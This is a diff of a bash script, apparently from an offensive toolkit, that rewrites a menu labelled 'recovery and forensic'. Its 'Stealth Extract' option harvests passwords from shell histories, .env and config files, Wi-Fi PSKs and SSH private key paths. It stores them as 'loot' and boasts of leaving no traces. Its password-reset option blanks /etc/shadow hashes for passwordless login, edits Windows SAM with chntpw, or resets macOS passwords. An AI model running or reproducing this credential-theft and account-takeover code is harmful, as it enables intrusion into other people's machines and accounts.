@@ -2432,92 +2432,132 @@ run_smart_osint_engine() {
 
 
 
+# ==============================================================================
+# @description: Модуль форензики хоста и управления локальными учетными записями
+# ==============================================================================
 run_pc_recovery_ultimate() {
-    # Слой 1: Заголовок через Голос [1]
-    core_engine_ui "RECOVERY & FORENSIC ENGINE"
+    clear
+    # Слой 1: Заголовок через компоненты интерфейса Ядра
+    core_engine_ui "h" "RECOVERY & FORENSIC ENGINE v3.0"
 
-    # Слой 2: Архитектор [2] и Органы чувств [3]
-    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.0"
-    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac"
+    # Слой 2: Органы чувств — Построение интерактивного меню
+    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.5 (Signatures Core)"
+    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac Account Management"
     core_engine_item "B" "Back" "Return to Main Menu"
+    core_engine_ui "line" ""
 
     local choice=$(core_engine_input "select" "Select Forensic Action")
-    [[ -z "$choice" || "$choice" == "b" ]] && return
+    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return
 
     case "$choice" in
-        "1") # --- Stealth Extract ---
-            core_engine_ui "i" "Инициализация PRIME_EXTRACT v1.0..."
-            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
+        "1") # --- Слой Stealth Extract (Сбор системных артефактов) ---
+            clear
+            core_engine_ui "h" "FORENSICS: STEALTH ARTIFACT EXTRACTION"
+            core_engine_ui "i" "Инициализация подсистем PRIME_EXTRACT..."
             
-            # Временный буфер для захвата данных
+            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
+            sleep 1
+            
+            # Временный буфер для аккумуляции собранных данных перед отправкой в loot
             local buffer=""
             
-            # 1. Анализ истории (Bash/Zsh) через Глушитель [7]
-            core_engine_ui "!" "Analyzing Command History..."
-            local hist=$(grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null)
+            # 1. Анализ истории команд терминалов (Bash/Zsh) через глобальные сигнатуры
+            core_engine_ui "i" "Парсинг истории терминалов на учетные данные..."
+            local hist=$(grep -hE "$GLOBAL_SIG_FORENSIC_HIST" /home/*/.{bash,zsh}_history 2>/dev/null)
             
-            # 2. Поиск конфигов и .env
-            core_engine_ui "!" "Scanning Configs & .env files..."
-            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null)
+            # 2. Поиск конфигурационных файлов и переменных окружения
+            core_engine_ui "i" "Сканирование структуры директорий на секреты и .env..."
+            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "$GLOBAL_SIG_FORENSIC_CONFIG" 2>/dev/null)
 
-            # 3. Wi-Fi профили (Сетевые доступы)
+            # 3. Анализ Wi-Fi профилей (Доступы к беспроводным сетям)
+            core_engine_ui "i" "Извлечение конфигураций беспроводных сетей..."
             local wifi=""
             [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)
 
-            # 4. SSH Ключи
-            core_engine_ui "!" "Locating SSH Private Keys..."
+            # 4. Поиск приватных криптографических ключей SSH
+            core_engine_ui "i" "Локация приватных SSH/PEM ключей..."
             local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)
 
-            # Слой 3: Сбор трофеев через узел [11]
-            buffer="Host: $(hostname)\nHistory:\n$hist\nConfigs:\n$configs\nWiFi:\n$wifi\nSSH:\n$ssh_keys"
+            # Слой 3: Структурирование и агрегация трофеев в хранилище Ядра
+            buffer="Host: $(hostname)\nTimestamp: $(date)\n\n[--- HISTORY ARTIFACTS ---]\n$hist\n\n[--- CONFIG SECRET ARTIFACTS ---]\n$configs\n\n[--- WIFI CREDENTIALS ---]\n$wifi\n\n[--- SSH PRIVATE KEYS ---]\n$ssh_keys"
+            
+            # Экспорт в системную loot-директорию
             core_engine_loot "forensic" "$buffer"
             
-            core_engine_ui "+" "Extraction Complete. No Python/LaZagne traces left."
+            core_engine_ui "line" ""
+            core_engine_ui "s" "Сбор артефактов успешно завершен. Следы LaZagne/Python отсутствуют."
             ;;
 
-        "2") # --- Smart Password Reset ---
-            core_engine_ui "i" "Detecting Target Environment..."
+        "2") # --- Слой Smart Password Reset (Управление доступом) ---
+            clear
+            core_engine_ui "h" "ADMINISTRATION: PASSWORD RESET MATRIX"
+            core_engine_ui "i" "Анализ целевой среды и структуры разделов..."
             
-            # Поиск Windows SAM через Мозг [5]
+            # Поиск Windows SAM реестра на смонтированных накопителях
             local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
             
             if [[ -n "$win_sam" ]]; then
-                core_engine_ui "+" "Windows SAM detected: $win_sam"
+                core_engine_ui "w" "Обнаружена целевая база данных Windows SAM: $win_sam"
+                # Проверка наличия и вызов утилиты обработки SAM-файлов
                 core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
             else
-                # Блок Unix (Определение OS через Метрики [12])
+                # Определение Unix-архитектуры на основе системных метрик Ядра
                 local os_t="Linux"
                 [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
-                core_engine_ui "i" "OS: $os_t detected."
+                core_engine_ui "i" "Идентифицирована операционная система: $os_t"
 
-                local users
+                local users=""
                 if [[ "$os_t" == "macOS" ]]; then
+                    # Парсинг локальных пользователей macOS через директорию служб
                     users=$(dscl . list /Users | grep -v '^_\|root')
                 else
+                    # Чистый парсинг реальных пользователей Linux (UID >= 1000) из /etc/passwd
                     users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                 fi
                 
-                [[ -z "$users" ]] && { core_engine_ui "e" "No local users found."; core_engine_wait; return; }
+                if [[ -z "$users" ]]; then
+                    core_engine_ui "e" "Локальные пользователи в системе не обнаружены."
+                    core_engine_wait
+                    return 1
+                fi
 
-                # Динамическое меню выбора пользователя
-                for u in $users; do core_engine_item "$u" "$u" "Local User"; done
-                local t_user=$(core_engine_input "select" "Select Target User")
+                core_engine_ui "line" ""
+                core_engine_ui "i" "Доступные учетные записи для модификации:"
                 
-                [[ -n "$t_user" && "$t_user" != "b" ]] && {
+                # Построение динамического меню на основе списка системных пользователей
+                for u in $users; do 
+                    core_engine_item "$u" "$u" "Локальный пользователь ОС"
+                done
+                core_engine_ui "line" ""
+                
+                local t_user=$(core_engine_input "select" "Выберите целевого пользователя")
+                [[ -z "$t_user" || "$t_user" == "b" || "$t_user" == "B" ]] && return
+
+                # Проверка, что выбранный пользователь действительно присутствует в списке
+                if echo "$users" | grep -qxw "$t_user"; then
                     if [[ "$os_t" == "Linux" ]]; then
-                        core_engine_ui "!" "Wiping password for $t_user..."
-                        # Атомарная правка через Санитара [8]
-                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping shadow password"
-                        core_engine_ui "+" "Linux password wiped (Empty Login enabled)."
+                        core_engine_ui "w" "Сброс пароля для пользователя $t_user (Очистка хэша shadow)..."
+                        # Атомарная безопасная правка /etc/shadow через встроенный изолятор ядра
+                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping Linux shadow password"
+                        core_engine_ui "s" "Хэш shadow очищен. Вход для пользователя '$t_user' теперь открыт без пароля."
+                        core_engine_loot "password_reset" "Сброшен пароль пользователя Linux: $t_user"
                     elif [[ "$os_t" == "macOS" ]]; then
-                        local np=$(core_engine_input "text" "Enter New Password")
-                        core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password"
-                        core_engine_ui "+" "macOS password updated."
+                        local np=$(core_engine_input "text" "Введите новый пароль для учетной записи macOS")
+                        if [[ -n "$np" ]]; then
+                            core_engine_ui "w" "Перезапись пароля через dscl..."
+                            core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password via DSCL"
+                            core_engine_ui "s" "Пароль пользователя macOS '$t_user' успешно изменен."
+                            core_engine_loot "password_reset" "Изменен пароль пользователя macOS: $t_user"
+                        fi
                     fi
-                }
+                else
+                    core_engine_ui "e" "Ошибка: Указанный пользователь не найден в системной таблице."
+                fi
             fi
             ;;
     esac
+
+    core_engine_ui "line" ""
     core_engine_wait
 }
 
